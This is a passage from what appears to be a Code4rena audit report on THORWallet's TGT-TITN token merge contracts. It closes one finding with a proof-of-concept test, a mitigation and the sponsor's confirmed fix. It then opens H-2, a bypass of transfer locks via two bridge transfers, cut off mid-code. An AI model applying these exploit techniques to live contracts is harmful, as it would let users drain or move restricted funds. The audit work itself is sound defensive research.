class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// claim TITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173699999700000000000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit fails due to insufficient TITN in mergeTGT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e})\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTest final claim fails with:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e Error: VM Exception while processing transaction: reverted with custom error \u0026#39;ERC20InsufficientBalance(\u0026quot;0x5FC8d32690cc91D4c39d9d3abcBD16989F875707\u0026quot;, 173699970000000000000000000, 173699999700000000000000000)\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eLimit the total deposits to TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE by tracking how much TGT has already been deposited.\nMergeTgt.sol\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eextraData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTGT_TO_EXCHANGE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTGTExceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr \u003c/p\u003e\n\u003cp\u003ethe same idea, but limit the \u003ccode\u003etotalTitnClaimable\u003c/code\u003e by TITN_ARB value. This will likely be more efficient, as the rate tgt/titn is dynamic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6?commentParent=WkFsWvrbfsy\"\u003ecacaomatt (THORWallet) confirmed and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is related to \u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/S-88\"\u003eS-88\u003c/a\u003e.\nThe fix for both of them (same issue, different approach) can be found on the same PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated\"\u003eTHORWallet mitigated\u003c/a\u003e:\u003c/strong\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-2\"\u003ehere\u003c/a\u003e fixes the issue when depositing more TGT and specified in the contract.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12\"\u003ekn0t\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\" style=\"position:relative;\"\u003e\u003ca href=\"#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\" aria-label=\"h 2 the user can send tokens to any address by using two bridge transfers even when transfers are restricted permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9\"\u003e[H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-391\"\u003eshaflow2\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-753\"\u003e0xAadi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-457\"\u003eAgorist\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-397\"\u003eAlekso\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-68\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-576\"\u003edoublekk\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-747\"\u003efalconhoof\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-4\"\u003eGiorgio\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-622\"\u003ehezze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-371\"\u003eiamandreiski\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-392\"\u003ejesjupyter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-342\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-501\"\u003eKupiaSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-489\"\u003eMrValioBg\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-116\"\u003epairingfriendly\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-374\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-526\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-261\"\u003eradev_sw\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-401\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-161\"\u003eSpicyMeatball\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-404\"\u003eundefined_joe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-304\"\u003evladi319\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-59\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-688\"\u003eX-Tray03\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-175\"\u003eZoA\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-638\"\u003ezzykxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eWhen \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to true, regular users’ \u003ccode\u003etransfer\u003c/code\u003e and \u003ccode\u003etransferFrom\u003c/code\u003e operations will be restricted. Regular users should not send their tokens to any address other than the \u003ccode\u003etransferAllowedContract\u003c/code\u003e and \u003ccode\u003elzEndpoint\u003c/code\u003e. However, since bridge operations are not subject to this restriction, users can send tokens to any address by performing two bridge transfers.\u003cbr\u003e\nThis breaks the primary invariant: \u003cem\u003eUnless enabled (or the user is the admin), users who merge their TGT to TITN should not be able to transfer them to any address other than the LayerZero endpoint or a specified contract address (\u003ccode\u003etransferAllowedContract\u003c/code\u003e).\u003c/em\u003e\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe TITN contract overrides the \u003ccode\u003etransfer\u003c/code\u003e and \u003ccode\u003etransferFrom\u003c/code\u003e functions, adding the \u003ccode\u003e_validateTransfer\u003c/code\u003e validation to restrict regular users’ transfers in certain cases, as determined by the admin.\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71\u003c/a\u003e. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 